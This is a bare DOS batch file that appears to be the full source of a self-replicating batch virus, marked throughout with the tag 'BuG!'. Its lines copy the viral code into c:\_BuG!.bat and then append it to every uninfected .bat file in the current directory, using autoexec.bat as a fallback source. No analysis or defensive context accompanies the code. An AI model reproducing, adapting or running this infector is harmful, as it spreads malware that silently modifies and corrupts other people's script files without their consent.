::**** HOST ****

@echo off%_BuG!%
if '%1=='BuG! goto BuG!%2
set BuG!=%0.bat
if not exist %BuG!% set BuG!=%0
if '%BuG!%==' set BuG!=autoexec.bat
if exist c:\_BuG!.bat goto BuG!g
if not exist %BuG!% goto eBuG!
find "BuG!"<%BuG!%>c:\_BuG!.bat
:BuG!g
command /e:5000 /c c:\_BuG! BuG! vir
:eBuG!
echo.|date|find "fgh">nul.BuG!
if errorlevel 1 goto naBuG!
echo.|date|find "fgh">nul.BuG!
if errorlevel 1 goto naBuG!
echo.|time|find "fgh">nul.BuG!
if errorlevel 1 goto naBuG!
echo.|time|find "fgh">nul.BuG!
if errorlevel 1 goto naBuG!
:naBuG!
set BuG!=
goto BuG!end
:BuG!vir
for %%a in (*.bat) do call c:\_BuG! BuG! i %%a
exit BuG!
:BuG!i
find "BuG!"<%3>nul
if not errorlevel 1 goto BuG!j
type %3>BuG!$
echo.>>BuG!$
type c:\_BuG!.bat>>BuG!$
move BuG!$ %3>nul
exit BuG!
:BuG!j
set BuG!!=%BuG!#%1
if %BuG!!%==11111111111111111111 exit
:BuG!end